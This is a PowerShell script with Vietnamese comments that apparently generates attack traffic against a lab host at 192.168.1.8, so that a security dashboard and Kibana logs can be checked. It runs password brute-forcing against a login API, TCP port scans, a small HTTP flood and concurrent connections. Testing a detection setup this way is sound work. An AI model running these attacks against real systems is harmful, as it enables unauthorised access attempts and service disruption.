# PowerShell Commands để tấn công từ Windows Host
# Copy và paste từng đoạn vào PowerShell

# ========================================
# 1. BRUTE FORCE ATTACK
# ========================================
Write-Host "🔐 Bắt đầu Brute Force Attack..." -ForegroundColor Red
$passwords = @("password123", "admin123", "123456", "qwerty", "letmein", "welcome", "password", "admin")
$emails = @("admin@example.com", "administrator@security.local", "root@local", "admin@security.local")

for ($i = 1; $i -le 15; $i++) {
    $email = $emails | Get-Random
    $password = $passwords | Get-Random
    Write-Host "Thử đăng nhập lần $i với $email:$password" -ForegroundColor Yellow
    
    try {
        $body = @{
            email = $email
            password = $password
        } | ConvertTo-Json
        
        Invoke-RestMethod -Uri "http://192.168.1.8:5001/api/auth/login" -Method POST -ContentType "application/json" -Body $body -TimeoutSec 5
    } catch {
        # Expected - wrong credentials
    }
    
    Start-Sleep -Seconds 1
}

# ========================================
# 2. PORT SCANNING
# ========================================
Write-Host "`n🔍 Bắt đầu Port Scanning..." -ForegroundColor Cyan
$commonPorts = @(22, 80, 443, 3000, 3306, 5001, 5432, 8080, 9000, 9200, 9300, 27017)

foreach ($port in $commonPorts) {
    Write-Host "Kiểm tra cổng $port" -ForegroundColor Yellow
    
    try {
        $tcpClient = New-Object System.Net.Sockets.TcpClient
        $tcpClient.Connect("192.168.1.8", $port)
        Write-Host "✅ Cổng $port mở" -ForegroundColor Green
        $tcpClient.Close()
    } catch {
        Write-Host "❌ Cổng $port đóng" -ForegroundColor Red
    }
    
    Start-Sleep -Milliseconds 500
}

# Quét nhanh cổng 1-100
Write-Host "`n⚡ Quét nhanh cổng 1-100..." -ForegroundColor Cyan
for ($port = 1; $port -le 100; $port++) {
    try {
        $tcpClient = New-Object System.Net.Sockets.TcpClient
        $tcpClient.Connect("192.168.1.8", $port)
        Write-Host "Cổng $port mở" -ForegroundColor Green
        $tcpClient.Close()
    } catch {
        # Port closed
    }
    
    if ($port % 20 -eq 0) {
        Write-Host "Đã quét đến cổng $port..." -ForegroundColor Yellow
    }
    
    Start-Sleep -Milliseconds 100
}

# ========================================
# 3. HTTP FLOOD ATTACK
# ========================================
Write-Host "`n🌊 Bắt đầu HTTP Flood Attack..." -ForegroundColor Magenta
for ($i = 1; $i -le 20; $i++) {
    Write-Host "HTTP request $i" -ForegroundColor Yellow
    
    try {
        # Attack frontend
        Invoke-WebRequest -Uri "http://192.168.1.8:3000/" -TimeoutSec 2 -UseBasicParsing | Out-Null
    } catch {
        # Expected timeout
    }
    
    try {
        # Attack backend health endpoint
        Invoke-WebRequest -Uri "http://192.168.1.8:5001/health" -TimeoutSec 2 -UseBasicParsing | Out-Null
    } catch {
        # Expected timeout
    }
    
    Start-Sleep -Milliseconds 200
}

# ========================================
# 4. MULTIPLE CONCURRENT CONNECTIONS
# ========================================
Write-Host "`n🔗 Bắt đầu Multiple Concurrent Connections..." -ForegroundColor Blue
$jobs = @()

for ($i = 1; $i -le 10; $i++) {
    $job = Start-Job -ScriptBlock {
        param($ip, $port)
        try {
            $tcpClient = New-Object System.Net.Sockets.TcpClient
            $tcpClient.Connect($ip, $port)
            Start-Sleep -Seconds 2
            $tcpClient.Close()
        } catch {
            # Connection failed
        }
    } -ArgumentList "192.168.1.8", 3000
    
    $jobs += $job
}

Write-Host "Đang chạy 10 kết nối đồng thời..." -ForegroundColor Yellow
Wait-Job $jobs | Out-Null
Remove-Job $jobs

Write-Host "`n================================================================" -ForegroundColor Yellow
Write-Host "✅ Hoàn thành tất cả attacks từ Windows Host!" -ForegroundColor Green
Write-Host "📊 Truy cập Dashboard để xem kết quả: http://192.168.1.8:3000" -ForegroundColor Cyan
Write-Host "📊 Truy cập Kibana để xem logs: http://192.168.1.8:5601" -ForegroundColor Cyan
